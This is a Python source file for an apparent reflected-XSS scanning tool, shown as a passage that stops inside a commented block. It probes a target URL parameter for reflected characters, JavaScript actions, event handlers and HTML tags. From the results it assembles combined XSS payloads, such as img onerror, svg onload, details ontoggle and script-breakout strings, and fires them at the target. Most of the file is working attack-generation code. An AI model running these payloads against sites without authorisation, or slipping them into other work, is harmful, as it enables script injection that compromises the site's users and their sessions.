# coding=utf-8
# Author: Jewel591

import re
import os
import signal
import sys
import threading
import time
import urllib.parse
import requests
from modules.argsparse import argsparse
from pip._vendor.distlib.compat import raw_input
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from modules import format, lists
from modules.precheck import PreCheck
from ui.start import Ui_MainWindow
try:
    from PyQt5 import QtCore, QtGui
    from PyQt5.QtCore import *
    from PyQt5.QtWidgets import QApplication, QMainWindow
except:
    print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"未安装 PyQt5，无法启动图形化工具")
from data import payload, urldata

time_start = time_end = ""



class MyMainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(MyMainWindow, self).__init__(parent)
        self.setupUi(self)
        # 如果不加 self，tt 只是一个局部变量，当初始化完成，该变量的生命周期就结束了，所以会报 QThread: Destroyed
        self.myworker = Worker()
        self.startx.clicked.connect(lambda: self.myworker.start())
        # 获取控制台输出
        sys.stdout = EmittingStream(textWritten=self.normalOutputWritten)

    def __del__(self):
        # Restore sys.stdout
        sys.stdout = sys.__stdout__

    def normalOutputWritten(self, text):
        """Append text to the QTextEdit."""
        # Maybe QTextEdit.append() works as well, but this is how I do it:
        # cursor = self.textEdit.textCursor()
        cursor = self.output.textCursor()
        # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+cursor)
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.output.setTextCursor(cursor)
        self.output.ensureCursorVisible()


class EmittingStream(QtCore.QObject):
    textWritten = QtCore.pyqtSignal(str)

    def write(self, text):
        self.textWritten.emit(str(text))


# class Worker(QThread):
#     def __init__(self):
#         super(Worker, self).__init__()
#
#     def run(self):
#         global time_start, time_end
#         time_start = time.time()
#
#         # 是否指定检测参数
#         intfromstr = {}
#         aa=PreCheck
#         allparameter = aa.getallparameter(self)
#         istargetvarnull = 0 if args.parameter=="*" else 1
#         if not args.parameter :
#             print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\n[!] 未指定测试参数，请指定参数：(共 "+str(len(PreCheck.getallparameter(self)))+" 个参数）")
#             print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"所有参数：")
#             for sss in list(allparameter.keys()):
#                 print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+sss)
#
#             for p,i in zip(allparameter.keys(),range(1,100)):
#                 print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[{}] {}".format(i,p))
#                 intfromstr.update({i:p})
#
#             while True:
#                 paradicKey = input("\n请输入目标参数对应序号("+"\033[1;34;8m输入 * 测试所有参数\033[0m"+")：")
#                 if paradicKey == "*":
#                     print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+" 检测到 *，测试所有参数")
#                     break
#                 if not paradicKey.isnumeric() or intfromstr.get(int(paradicKey)) ==None:
#                     print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+'\n\033[1;31;8m[!] 输入不合法，请重新输入参数对应的序号： \033[0m')
#                 else:
#                     break
#
#             # urldata.targetvar = vardic.get(int(paradicKey))
#             if paradicKey!="*":
#                 urldata.targetvar=intfromstr.get(int(paradicKey))
#                 print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"目标参数: ", urldata.targetvar)
#
#             if paradicKey=="*":
#                 print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"测试所有参数的功能还没写！")
#                 istargetvarnull=0
#
#         else:
#             urldata.targetvar = args.parameter
#
#         # PreCheck()
#         # begin.getvars()
#         # istargetvarnull = len(urldata.targetvar)
#         # if len(urldata.targetvar) == 0 and not re.search("(REFERER)", urldata.targeturl) and not re.search("(COOKIE)", urldata.targeturl):
#         #     print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\n"+'\033[1;34;8m[0] 将对所有参数进行测试！ \033[0m'+"\n")
#         #     # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+" 将对以下 "+str(len(urldata.targetvarlist))+" 个参数进行测试:"+"\n")
#         #     # for var2one in urldata.targetvarlist:
#         #     #     print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[目标参数] "+var2one)
#         #     time.sleep(1.5)
#         print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"istargetnull:",istargetvarnull)
#
#         for var2tow in list(allparameter.keys()):
#             if istargetvarnull == 0:
#                 urldata.targetvar = var2tow
#             urldata.urldata_init()
#             payload.keyword_init()
#             # begin.rebuildurl()
#             ssss=PreCheck()
#             ssss.checkurlaccessible()
#             # if urldata.urlsuccess== "no":
#             #     return
#             # if urldata.urlxssalbe == "no":
#             #     if istargetvarnull > 0:
#             #         return
#             #     else:
#             #         continue
#             begin2 = CheckStart()
#             begin2.check_close()
#             begin2.check_action()
#             begin2.check_onevent()
#             begin2.check_tag()
#             begin2.check_combination_close_yes()
#             begin2.check_combination_close_no()
#             begin2.checkurlaccessibleInTheEnd()
#             # begin2.check_illusion()
#             # format.breakline()
#             time_end = time.time()
#             print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\n"+"测试耗时：", time_end - time_start)
#             if istargetvarnull > 0:
#                 return


def Go():
    global time_start, time_end
    time_start = time.time()

    # 是否指定检测参数
    intfromstr = {}

    istargetvarnull = 0 if args.parameter=="*" else 1
    if not args.parameter :
        allparameter = PreCheck.getallparameter()
        print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"未指定测试参数，请指定参数：(共 "+str(len(allparameter))+" 个参数）")
        # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"所有参数：")
        # for sss in list(allparameter.keys()):
        #     print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+sss)

        for p,i in zip(allparameter.keys(),range(1,100)):
            print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[{}] {}".format(i,p))
            intfromstr.update({i:p})

        while True:
            paradicKey = input("\n请输入目标参数对应序号("+"\033[1;34;8m输入 * 测试所有参数\033[0m"+")：")
            if paradicKey == "*":
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+" 检测到 *，测试所有参数")
                break
            if not paradicKey.isnumeric() or intfromstr.get(int(paradicKey)) ==None:
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+'\n\033[1;31;8m[!] 输入不合法，请重新输入参数对应的序号： \033[0m')
            else:
                break

        if paradicKey!="*":
            urldata.targetvar=intfromstr.get(int(paradicKey))
            print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"目标参数: ", urldata.targetvar)

        if paradicKey=="*":
            print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"测试所有参数的功能还没写！")
            istargetvarnull=0

    else:
        urldata.targetvar = args.parameter

    if istargetvarnull==1:
        urldata.urldata_init()
        payload.keyword_init()
        if PreCheck().checkurlaccessible()==0:
            sys.exit()
        print("\033[1;34m[" + str(
            time.strftime("%H:%M:%S", time.localtime())) + "]\033[0m " + "Testing parameter:："+urldata.targetvar)
        begin2 = CheckStart()
        begin2.check_close()
        begin2.check_action()
        begin2.check_onevent()
        begin2.check_tag()
        begin2.check_combination_close_yes()
        begin2.check_combination_close_no()
        begin2.checkurlaccessibleInTheEnd()
        time_end = time.time()
        print("Time-consuming：", time_end - time_start)
        if istargetvarnull > 0:
            exit()
    if istargetvarnull==0:
        for var2tow in list(allparameter.keys()):
            if istargetvarnull == 0:
                urldata.targetvar = var2tow
            urldata.urldata_init()
            payload.keyword_init()
            # begin.rebuildurl()
            ssss=PreCheck()
            ssss.checkurlaccessible()
            begin2 = CheckStart()
            begin2.check_close()
            begin2.check_action()
            begin2.check_onevent()
            begin2.check_tag()
            begin2.check_combination_close_yes()
            begin2.check_combination_close_no()
            begin2.checkurlaccessibleInTheEnd()
            time_end = time.time()
            print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\n"+"测试耗时：", time_end - time_start)
            if istargetvarnull > 0:
                return

class CheckStart():

### 闭合符号测试

    def check_close(self):
        format.breakline()
        print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m " + "\033[1;33m[INFO]\033[0m " +"Checking sensitive characters"+"\n")

        def startcheck(payload):
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload))), PreCheck.responsebyurl(self, payload)):  # 使用 re.escape()
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[SUCCESS]：", payload.replace("591", ""))
                urldata.black['close'].append(payload)

                # N = 1000
                # for i in range(N):
                #     print("进度:{0}%".format(round((i + 1) * 100 / N)), end="\r")
                #     time.sleep(0.01)
            else:
                if args.verbose: print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\033[1;30m[filtered]：", payload.replace("591", "")+"\033[0m")
                urldata.white['close'].append(payload)

        N=len(payload.keyword['close'])


        for p,i in zip(payload.keyword['close'],range(N)):
            print("进度:{0}%".format(round((i + 1) * 100 / N)), end="\r")
            time.sleep(0.1)
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()

        if re.search("/|%2f","".join(urldata.black['close'])) :
            for payload2 in payload.keyword['close_tag']:
                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload2))),PreCheck.responsebyurl(self,payload2)):
                    print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[SUCCESS]：", payload2.replace("591", ""))
                    urldata.black['close_tag'].append(payload2)
                else:
                    if args.verbose: print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[Failure]：", payload2.replace("591", ""))
                    urldata.white['close_tag'].append(payload2)

        return

### 动作测试


    def check_action(self):
        format.breakline()
        # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"动作测试".rjust(37, " ")+"\n")
        print("\033[1;34m[" + str(time.strftime("%H:%M:%S", time.localtime())) + "]\033[0m " + "\033[1;33m[INFO]\033[0m " + "Checking JavaScript Code" + "\n")

        def startcheck(payload):

            # replace("\\\\\\\\","\\\\") 是因为 unicode 编码之后，再使用urllib.parse.unquote（）会变成 8 个\，这时候正则匹配的是 4 个\，实际只需匹配 2 个\，所以要做个replace
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload))).replace("\\\\\\\\", "\\\\"),PreCheck.responsebyurl(self,payload)):
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[SUCCESS]：", payload.replace("591", ""))
                urldata.black['action'].append(payload)
            else:
                if args.verbose: print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[Failure]：", payload.replace("591", ""))
                urldata.white['action'].append(payload)

        ### 执行线程
        for p in payload.keyword['action']:
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()

        if urldata.black['action']:
            urldata.signal['action'] = 'yes'
            return



### ON 事件测试

    def check_onevent(self):
        # format.breakline()
        # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"事件测试".rjust(37, " ")+"\n")
        def startcheck(payload):
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload))),PreCheck.responsebyurl(self, payload)):  # 使用 re.escape()
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[SUCCESS]：", payload.replace("=591", ""))
                urldata.black['onevent'].append(payload)
            else:
                if args.verbose: print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[Failure]：", payload.replace("=591", ""))
                urldata.white['onevent'].append(payload)

        for p in payload.keyword['onevent']:
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()
            

        if urldata.black['onevent']:
            urldata.signal['onevent'] = 'yes'

### 标签测试

    def check_tag(self):
        # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"标签测试".rjust(37, " ")+"\n")
        format.breakline()
        print("\033[1;34m[" + str(time.strftime("%H:%M:%S",
                                                time.localtime())) + "]\033[0m " + "\033[1;33m[INFO]\033[0m " + "Checking HTML TAG " + "\n")

        if ">" not in "".join(urldata.black['close']) and "%3e" not in "".join(urldata.black['close']) :
            if "<" not in "".join(urldata.black['close']) and "%3c" not in "".join(urldata.black['close']):
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+'\033[1;32;8m[警告] < > 标签均被[Failure], 无法插入标签 \033[0m')
                return
            else:
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+'\033[1;32;8m[警告] > 标签被[Failure], < 标签[SUCCESS], 能利用 Payload 可能较少 \033[0m')

        if ">" not in "".join(urldata.black['close']) and "%3e" in "".join(urldata.black['close']):
            payload.keyword['tag'] = format.payloadReplace(payload.keyword['tag'],">","%3e")
            print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+'\033[1;37;8m[!] > >>> %3e \033[0m')
        if "<" not in "".join(urldata.black['close']) and "%3c" in "".join(urldata.black['close']):
            payload.keyword['tag'] = format.payloadReplace(payload.keyword['tag'],"<","%3c")
            print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+'\033[1;37;8m[!] < >>> %3c \033[0m')

        def startcheck(payload):
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload))), PreCheck.responsebyurl(self, payload)):
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[SUCCESS]：", payload.replace("591", ""))
                urldata.black['tag'].append(payload)
            else:
                if args.verbose: print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[Failure]：", payload.replace("591", ""))
                urldata.white['tag'].append(payload)

        for p in payload.keyword['tag']:
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()


        if urldata.black['tag']:
            urldata.signal['tag'] = 'yes'

        return



### 不闭合标签

    def check_combination_close_no(self):

        # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"组合测试（不闭合标签）".rjust(37, " ")+"\n")
        format.breakline()
        print("\033[1;34m[" + str(time.strftime("%H:%M:%S",time.localtime())) + "]\033[0m " + "\033[1;33m[INFO]\033[0m " + "Generating payload ..." )
        N = 200
        for i in range(N):
            print("进度:{0}%".format(round((i + 1) * 100 / N)), end="\r")
            time.sleep(0.01)


        str591 = ""
        for e in urldata.black['close']:
            if e =="%22591" or e =="%27591" or e =="\"591" or e=="\'591":
               str591 += e.replace("591", "")
        # 对"和%22 去重
        if "%22" in str591 and "\"" in str591:
            str591 = str591.replace("%22","")
        if "%27" in str591 and "\'" in str591:
            str591 = str591.replace("%27","")

        if re.search(re.escape("onclick"), "".join(urldata.black['onevent']), re.IGNORECASE) and re.search(re.escape("accesskey"), "".join(urldata.black['onevent']), re.IGNORECASE):
            payload.keyword['combination_close_no'].append(
                str591 + " " + "onclick=" + urldata.black['action'][0] + " " + "AcCESsKeY=\"j\"" + " " + "nsf=" + str591)
        else:
            print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\033[1;31m[INFO]\033[0m The combination of onclick and accesskey cannot be used. If the injection point is in the hidden attribute, it may not be triggered.")
            iiss = 1
            for e1 in urldata.black['action']:
                for e2 in urldata.black['onevent']:
                    if iiss < 2 and e2 !="AcCESsKeY=591":
                        if e2=="oNcLIck=591" and "AcCESsKeY=591" in urldata.black['onevent']:
                            iiss += 1
                            if "\"591" in urldata.black['close']:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=\"j\""+" "+"nsf="+str591)
                                break
                            if "'591" in urldata.black['close']:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY='j'"+" "+"nsf="+str591)
                                break
                            if "%22591" in urldata.black['close']:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=%22j%22"+" "+"nsf="+str591)
                                break
                            if "%27591" in urldata.black['close']:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"AcCESsKeY=%27j%27"+" "+"nsf="+str591)
                            else:
                                payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"nsf="+str591)

                        else:
                            iiss += 1
                            payload.keyword['combination_close_no'].append(str591 + " " + e2.replace("591", "") + e1 + " "+"nsf="+str591)
        try:
            if "/591" in urldata.black['close']:
                payload.keyword['combination_close_no'].append(str591 + ";" + urldata.black['action'][0] + "//")
            else:
                if "%2f591" in urldata.black['close']:
                    payload.keyword['combination_close_no'].append(str591 + ";" + urldata.black['action'][0] + "%2f%2f")
            if "/591" in urldata.black['close']:
                payload.keyword['combination_close_no'].append(str591 + ";}" + urldata.black['action'][0] + ";{//")
            else:
                if "%2f591" in urldata.black['close']:
                    payload.keyword['combination_close_no'].append(str591 + ";});" + urldata.black['action'][0] + ";{%2f%2f")

            if "/591" in urldata.black['close']:
                payload.keyword['combination_close_no'].append(str591 + ";});" + urldata.black['action'][0] + ";$(function(){//")
            else:
                if "%2f591" in urldata.black['close']:
                    payload.keyword['combination_close_no'].append(str591 + ";});" + urldata.black['action'][0] + ";$(function(){%2f%2f")
        except:
            pass

        # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\n\033[1;34;8m[!] payload 生成（可能需要使用 BurpSuite URL解码）:\033[0m\n")
        # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"payload.keyword['combination_close_no']:")




### 判断是否onevent 和 action 都被[Failure]

        if urldata.signal['action'] == urldata.signal['onevent'] == 'no':
            # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[!] 弹窗函数 和 ON事件 全被[Failure]，不可弹窗，故不再做组合测试".center(7))
            print("\033[1;34m[" + str(time.strftime("%H:%M:%S",
                                                    time.localtime())) + "]\033[0m " + "\033[1;31m[WARNING]\033[0m " + "No payload available " + "\n")

        if len(payload.keyword['combination_close_no'])==0:
            print("\033[1;34m[" + str(time.strftime("%H:%M:%S",
                                                    time.localtime())) + "]\033[0m " + "\033[1;31m[INFO]\033[0m " + "No payload available " + "\n")
            return
        else:
            print("\033[1;34m[" + str(time.strftime("%H:%M:%S",
                                                    time.localtime())) + "]\033[0m " + "\033[1;33m[INFO]\033[0m " + "Finish generated " + str(
                len(payload.keyword['combination_close_no'])) + " payloads" + "\n")
            for erer in payload.keyword['combination_close_no']:
                print("\033[1;34m[" + str(time.strftime("%H:%M:%S", time.localtime())) + "]\033[0m " + "Payload: " + erer)
                time.sleep(0.1)
            print("\n\033[1;34m[" + str(time.strftime("%H:%M:%S", time.localtime())) + "]\033[0m " + "Analysing reflections...")


        def startcheck(payload):
            if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(payload))).replace(" ", ".*").replace("\\\\\\\\", "\\\\").replace("\\.*", ".*"), PreCheck.responsebyurl(self, payload)):  # 使用 re.escape()
                urldata.black['combination_close_no'].append(payload)
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\033[1;32;8m[SUCCESS]：\033[0m", payload)
                # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"\n\033[1;32;8m[SUCCESS] ：\033[0m" + re.sub(re.escape("abcdef1234"), payload, urldata.get_url))
            else:
                if args.verbose: print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[Failure]：", payload.replace("591", ""))
                urldata.white['combination_close_no'].append(payload)

        for p in payload.keyword['combination_close_no']:
            mythread = threading.Thread(target=startcheck(p))
            mythread.start()
        return


    def check_combination_close_yes(self):
            format.breakline()
            # print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"组合测试（闭合标签）".rjust(37, " ")+"\n")
            print("\033[1;34m[" + str(time.strftime("%H:%M:%S",
                                                    time.localtime())) + "]\033[0m " + "\033[1;33m[INFO]\033[0m " + "Generating payload ...")
            N = 100
            for i in range(N):
                print("进度:{0}%".format(round((i + 1) * 100 / N)), end="\r")
                time.sleep(0.01)

            ### 判断是否onevent 和 action 都被[Failure]

            if urldata.signal['action'] == urldata.signal['onevent'] == 'no':
                print("\033[1;34m["+str(time.strftime("%H:%M:%S", time.localtime()))+"]\033[0m "+"[!] 弹窗函数 和 ON事件 全被[Failure]，不可弹窗，故不再做组合测试".center(7))
                return  # return 退出整个函数
            ### 构造 payload

            str592 = ""
            for e in urldata.black['close']:
                if e == "%22591" or e == "%27591" or e == "\"591" or e == "\'591" or e=="/591" or e =="%2f591" or e == ">591" or e =="%3e591":
                    str592 += e.replace("591", "")
            if re.search(re.escape("script"), "".join(urldata.black['tag']), re.IGNORECASE):
                str592="</ScRipt>"+str592
            pdd = urldata.black['tag'][:]
            for pd in pdd:
                if "/" not in pd and pd.replace("591","").replace(" ","")  +"/591" in urldata.black['tag']:
                    urldata.black['tag'].remove(pd)

            if ">" not in "".join(urldata.black['tag']) and "%3e" in "".join(urldata.black['close']):
                payload.keyword['combination_close_yes'] = format.payloadReplace(payload.keyword['combination_close_yes'], ">", "%3e")

            for e1 in urldata.black['tag']:
                try:
                    if re.search(re.escape("script"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 +"<ScRipt>" + urldata.black['action'][0] + "</ScRipt>" )

                    if re.search(re.escape("<a>"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 +"<A" +" " + urldata.black['onevent'][0].replace("591", "") + urldata.black['action'][0] + ">" + "591</A>" )

                    if re.search(re.escape("input/"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 +"<iNpUt" +"/" + urldata.black['onevent'][0].replace("591", "") + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("input"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 +"<iNpUt" +" " + urldata.black['onevent'][0].replace("591", "") + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("textarea"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 +"<teXtaReA" +"/" + urldata.black['onevent'][0].replace("591", "") + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("textarea"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 +"<teXtaReA" +" " + urldata.black['onevent'][0].replace("591", "") + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("select"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 +"<select" +"/" + urldata.black['onevent'][0].replace("591", "") + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("select"), e1, re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 +"<select" +" " + urldata.black['onevent'][0].replace("591", "") + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("video"), e1, re.IGNORECASE) and re.search(re.escape("onerror"), "".join(
                            urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<video><source" + "/" + "oNErroR=" + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("video"), e1, re.IGNORECASE)and re.search(re.escape("onerror"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<video><source" + " " + "oNErroR=" + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("img"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.black['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<ImG" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("img"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.black['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<ImG" + " " + "src=x" + " " + "OnErrOr=" + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("audio"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.black['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<AuDiO" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("audio"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.black['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<AuDiO" + " " + "src=x" + " " + "OnErrOr=" + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("details"), e1, re.IGNORECASE) and re.search(re.escape("ontoggle"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<DeTaIlS" + "/" + "oNToGgle=" + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("details"), e1, re.IGNORECASE) and re.search(re.escape("ontoggle"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<DeTaIlS" + " " + "oNToGgle=" + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("body"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<BoDy" + "/" + "oNLoAd=" + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("body"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<BoDy" + " " + "oNLoAd=" + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("svg"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<SvG" + "/" + "oNLoAd=" + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("svg"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<SvG" + " " + "oNLoAd=" + urldata.black['action'][0] + "%20")

                    if re.search(re.escape("iframe"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<IfrAme" + "/" + "oNLoAd=" + urldata.black['action'][0] + "%20")
                    elif re.search(re.escape("iframe"), e1, re.IGNORECASE) and re.search(re.escape("onload"), "".join(urldata.black['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append(
                            str592 + "<IfrAme" + " " + "oNLoAd=" + urldata.black['action'][0] + "%20")

                    ### 用/代替空格

                    # if re.search(re.escape("input"), e1, re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592+"<iNpUt"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")
                    #
                    # if re.search(re.escape("textarea"), e1, re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592+"<teXtaReA"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")

                    # if re.search(re.escape("select"), e1, re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592+"<select"+"/"+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">")

                    # if re.search(re.escape("video"), e1, re.IGNORECASE)and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<video><source" + "/" + "oNErroR=" +urldata.unsensitive['action'][0] + ">")

                    # if re.search(re.escape("img"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<ImG" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")

                    # if re.search(re.escape("audio"), e1, re.IGNORECASE) and re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                    #     payload.keyword['combination_close_yes'].append(
                    #         str592 + "<AuDiO" + "/" + "src=x" + "/" + "OnErrOr=" + urldata.unsensitive['action'][0] + ">")
                    #
